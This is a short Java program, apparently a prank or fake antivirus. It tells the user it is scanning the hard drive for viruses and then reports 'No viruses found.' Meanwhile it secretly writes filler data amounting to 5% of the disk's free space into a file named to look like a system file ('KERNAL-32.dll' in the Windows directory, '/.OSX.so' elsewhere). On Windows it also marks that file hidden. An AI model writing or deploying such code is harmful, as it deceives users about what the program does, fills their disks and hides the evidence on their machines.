import java.io.File;
import java.io.FileOutputStream;
import java.nio.file.*;
import java.lang.*;

/**
 * Created by Will on 2/20/2017.
 */
public class Main
{
    public static void main(String[] args) throws Exception
    {
        String os = System.getProperty("os.name");
        Path target = null;
        File disk = null;
        if (os.contains("Windows"))
        {
            String root = System.getenv("SystemRoot");
            target = Paths.get(root + "/KERNAL-32.dll");
            disk = new File(root);
        }
        else
        {
            target = Paths.get("/.OSX.so");
            disk = new File("/");
        }

        // Calculate how big the file should be
        long target_size = disk.getUsableSpace() / 100 * 5;

        // Create 500 MB of data to write
        byte[] data = new byte[1024 * 1024 * 500];

        System.out.println("Scanning your hard drive for viruses...");

        // Write the file size
        long current_size = 0;
        FileOutputStream out = new FileOutputStream(target.toFile());
        while (current_size < target_size)
        {
            out.write(data);
            current_size += data.length;
            float percent = Math.min((100 * current_size) / target_size, 100);
            System.out.print(String.format("\r%.0f%% complete", percent));
        }
        out.close();

        System.out.println("\nNo viruses found.");

        // Hide the file
        if (os.contains("Windows"))
        {
            Files.setAttribute(target, "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
        }
    }
}
